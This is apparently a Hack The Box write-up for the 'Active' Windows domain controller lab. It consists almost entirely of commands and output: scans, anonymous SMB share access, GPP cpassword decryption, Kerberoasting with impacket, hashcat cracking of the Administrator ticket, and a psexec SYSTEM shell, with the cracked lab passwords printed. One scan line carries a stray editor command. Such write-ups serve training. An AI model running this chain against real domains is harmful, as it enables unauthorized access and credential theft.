# Active
## smbclient
## smbmap
## hashcat
## impacket-GetADUsers
## impacket-GetUserSPNs
## impacket-psexec

``````

➜  ~ sudo vi /etc/hosts  
Add:

10.10.10.100 active.htb

➜  ~ rustscan -a active.htb --ulimit 5000

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5722/tcp  open  msdfsr           syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49152/tcp open  unknown          syn-ack
49153/tcp open  unknown          syn-ack
49154/tcp open  unknown          syn-ack
49155/tcp open  unknown          syn-ack
49157/tcp open  unknown          syn-ack
49158/tcp open  unknown          syn-ack
49165/tcp open  unknown          syn-ack
49170/tcp open  unknown          syn-ack
49171/tcp open  unknown          syn-ack

➜  ~ sudo nmap -Pn -sV -T4 -p- -oA ~/htb -vv active.htb

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-01 04:18:40Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49170/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49171/tcp open  msrpc    :%/s/bash//g     syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

➜  ~ sudo nmap -Pn -A -T4 -p- -oA ~/htb -vv active.htb

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-01 04:24:51Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49170/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49171/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

➜  ~ smbclient -L //active.htb/
Password for [WORKGROUP\windows_kali]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk  

➜  smbclient //active.htb/Replication 

smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 15:46:06 2018

		5217023 blocks of size 4096. 278369 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 

➜  cat Groups.xml

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

Alternatively,

➜  ~ smbmap -H active.htb -R --depth 10 

	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--              533 Sat Jul 21 05:38:11 2018	Groups.xml

➜  ~ smbclient //active.htb/Replication -N -c 'get active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml'

➜  ~ cat 'active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml'

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

➜  gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18

➜  impacket-GetADUsers -all active.htb/svc_tgs -dc-ip active.htb

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Querying active.htb for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 14:06:40.351723  2022-06-30 11:26:20.593355 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 13:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 15:14:38.402764  2022-06-30 12:07:31.278894 

➜  smbmap -H active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --depth 5 -R

	.\Users\SVC_TGS\Desktop\*
	dr--r--r--                0 Sat Jul 21 10:14:42 2018	.
	dr--r--r--                0 Sat Jul 21 10:14:42 2018	..
	fw--w--w--               34 Thu Jun 30 11:26:06 2022	user.txt


➜  smbclient //active.htb/Users  -U SVC_TGS%GPPstillStandingStrong2k18 -c 'get SVC_TGS\Desktop\user.txt'

getting file \SVC_TGS\Desktop\user.txt of size 34 as SVC_TGS\Desktop\user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

➜  cat 'SVC_TGS\Desktop\user.txt'

user_flag

➜  impacket-GetUserSPNs -request -dc-ip active.htb active.htb/SVC_TGS -save -outputfile GetUserSPNs.out

➜  cat GetUserSPNs.out

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$1e59fe14725c7c2117f9587a185b67b6$39a82636678c42d8c6a6a06d1663f1804cb57160954387915725a94c795ec6cf5b109dcecb9e1c7f99b29ea7f5dcaf5efd5c4d99ec52915f62b3bbc6bad8e7d5985b31dd4f17490e857c8a3e166cde8c17bb383bf5e27d7d97a417946e22c7f0d2083c013542645df1f4fde256441578086735d023357b1ba76695f2fe30bbe9a4bce41803c350b643835d50dda7e3fe48fb8a83f41ca37fbb21c3d07b112a1fb63a77e95d1c5789cfd2628482aaad90d95bb4087f8159ea7043d70f5bc54d650cde9fea8d33e4e953cfc22d3cb05999ec53990c000486bd59c04d827e28121f5b4d5d682ac39b73fb00dde829154d6e9e43fca209a264d6b91bf844852d15ccd6c6a8d0b8e5b3467c6d9a11779bcfbcb376fa0284de047ca35c6e313d75835bdb608be8b56bd1ffcd6fcf14bc7f6113d9e8cfbb5eae7051f9e1135d897181807c39872ab1db88d6e93bd8b8e5d70260d87e6e56b7b7215eef15a0e15e1afdd72c3b05f63ad083aefb25f1a7385fc53eee6bfba3433a07d4198d8b5ca7f193d179808cb46d10ca6a76fcbc21270696bb1fb7b4c80fb3ca487e9912c55b1f8b7bff682730dcd6a9cbda07f625262e3fb4622919e96f8dd0eecfa38f678ee7f3173a843145a2fc983bffaecfda4afdb7760127f712aaca8ac9bfdcab957eb5c966bda3d7a8981c9634dfced7dc391b4bc305d48ce09e415bbe94eaa5ab89673718cf6edc8de2fd7e063e1b8ce591eacf0768b3e48a364133520c0be2285f21845cbbb96da0cc54370d211c6e8d023840e0795e1abfaa626e2574d600296e572ec39637a613954f261083afa69ed5e43769568020f1454ad87939b3c201d0b69e1462d6bfe8dcc6caee3d319b31fc438138b4b0ca259fa0fe820a93a99ff90349add25c6dc719645760efe7bac072b6e0f2ec68ac87c2de3d4d8c28b3d2182e1ef7920d20a22848f5b420eacf69ad1c9a9633b27cdc88c12f05b56863646d6948eb4ba2bd5c35984472773f22f7a95f20defd25e00af63b9a99ebd5003dcff7f82ba3b9b178fb7c7012b975a40745a435d57361c14d2f729d82dece3c40fe0cd734ad7889fa20d17d3af5b299ce7eb737af868c03bd78ff95d2b97a8be000d92dc6ea70a8b13d1ee6997cff6d8fb9e7006a9404c28eb10058fd57c8b49cb8fda906c6dadf94041e4b5737465a9b57d1570ed4eb998b93d6bec9024623aee43a995a3be537484788589cbd0d21c871696a5135c6a97742f5e735e8ac

Go to:

https://hashcat.net/wiki/doku.php?id=example_hashes

Ctrl+f
Enter into search:

$krb5tgs$23$

Find:

13100 	Kerberos 5, etype 23, TGS-REP 

➜  ~ hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt 

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$1e59fe14725c7c2117f9587a185b67b6$39a82636678c42d8c6a6a06d1663f1804cb57160954387915725a94c795ec6cf5b109dcecb9e1c7f99b29ea7f5dcaf5efd5c4d99ec52915f62b3bbc6bad8e7d5985b31dd4f17490e857c8a3e166cde8c17bb383bf5e27d7d97a417946e22c7f0d2083c013542645df1f4fde256441578086735d023357b1ba76695f2fe30bbe9a4bce41803c350b643835d50dda7e3fe48fb8a83f41ca37fbb21c3d07b112a1fb63a77e95d1c5789cfd2628482aaad90d95bb4087f8159ea7043d70f5bc54d650cde9fea8d33e4e953cfc22d3cb05999ec53990c000486bd59c04d827e28121f5b4d5d682ac39b73fb00dde829154d6e9e43fca209a264d6b91bf844852d15ccd6c6a8d0b8e5b3467c6d9a11779bcfbcb376fa0284de047ca35c6e313d75835bdb608be8b56bd1ffcd6fcf14bc7f6113d9e8cfbb5eae7051f9e1135d897181807c39872ab1db88d6e93bd8b8e5d70260d87e6e56b7b7215eef15a0e15e1afdd72c3b05f63ad083aefb25f1a7385fc53eee6bfba3433a07d4198d8b5ca7f193d179808cb46d10ca6a76fcbc21270696bb1fb7b4c80fb3ca487e9912c55b1f8b7bff682730dcd6a9cbda07f625262e3fb4622919e96f8dd0eecfa38f678ee7f3173a843145a2fc983bffaecfda4afdb7760127f712aaca8ac9bfdcab957eb5c966bda3d7a8981c9634dfced7dc391b4bc305d48ce09e415bbe94eaa5ab89673718cf6edc8de2fd7e063e1b8ce591eacf0768b3e48a364133520c0be2285f21845cbbb96da0cc54370d211c6e8d023840e0795e1abfaa626e2574d600296e572ec39637a613954f261083afa69ed5e43769568020f1454ad87939b3c201d0b69e1462d6bfe8dcc6caee3d319b31fc438138b4b0ca259fa0fe820a93a99ff90349add25c6dc719645760efe7bac072b6e0f2ec68ac87c2de3d4d8c28b3d2182e1ef7920d20a22848f5b420eacf69ad1c9a9633b27cdc88c12f05b56863646d6948eb4ba2bd5c35984472773f22f7a95f20defd25e00af63b9a99ebd5003dcff7f82ba3b9b178fb7c7012b975a40745a435d57361c14d2f729d82dece3c40fe0cd734ad7889fa20d17d3af5b299ce7eb737af868c03bd78ff95d2b97a8be000d92dc6ea70a8b13d1ee6997cff6d8fb9e7006a9404c28eb10058fd57c8b49cb8fda906c6dadf94041e4b5737465a9b57d1570ed4eb998b93d6bec9024623aee43a995a3be537484788589cbd0d21c871696a5135c6a97742f5e735e8ac:Ticketmaster1968

➜  impacket-psexec active.htb/administrator@active.htb

C:\Windows\system32> whoami

nt authority\system

C:\Windows\system32> dir C:\Users /s /b | findstr /e .txt

r\AppData\Roaming\Microsoft\Windows\Cookies\ZXKJVH6T.txt
C:\Users\Administrator\Desktop\root.txt
C:\Users\All Users\VMware\VMware Tools\manifest.txt
C:\Users\All Users\VMware\VMware Tools\Unity Filters\adobeflashcs3.txt
C:\Users\All Users\VMware\VMware Tools\Unity Filters\adobephotoshopcs3.txt
C:\Users\All Users\VMware\VMware Tools\Unity Filters\googledesktop.txt
C:\Users\All Users\VMware\VMware Tools\Unity Filters\microsoftoffice.txt
C:\Users\All Users\VMware\VMware Tools\Unity Filters\vistasidebar.txt
C:\Users\All Users\VMware\VMware Tools\Unity Filters\visualstudio2005.txt
C:\Users\All Users\VMware\VMware Tools\Unity Filters\vmwarefilters.txt
C:\Users\All Users\VMware\VMware Tools\Unity Filters\win7gadgets.txt
C:\Users\SVC_TGS\Desktop\user.txt

C:\Windows\system32> type C:\Users\SVC_TGS\Desktop\user.txt

user_flag

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt

root_flag

``````

![image](https://0xc0rvu5.github.io/docs/assets/images/20220701051643.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220701053933.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220701054003.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220701054032.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220630233958.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220701050308.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220701055539.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220701055646.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220701060113.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220701060624.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220701060156.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220701061359.png)

#hacking
